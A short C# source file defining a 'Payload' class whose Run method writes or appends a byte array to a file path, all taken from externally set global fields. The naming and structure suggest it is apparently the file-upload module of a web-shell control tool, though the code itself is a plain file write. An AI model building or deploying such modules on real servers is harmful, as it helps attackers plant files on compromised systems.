using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;

public class Payload
{

    public string Run()
    {
        Directory.SetCurrentDirectory(Global.pwd);
        if (!File.Exists(Global.path) || Global.sign>0)
        {
            if(Global.sign == 1 || Global.sign == 0){
                File.WriteAllBytes(Global.path, Global.data);
            }else if(Global.sign == 2 && File.Exists(Global.path)){
                using (FileStream fs = File.Open(Global.path, FileMode.Append, FileAccess.Write)){
                    fs.Write(Global.data, 0, Global.data.Length);
                }
            }
            return "1";
        }
        return "0";
    }
}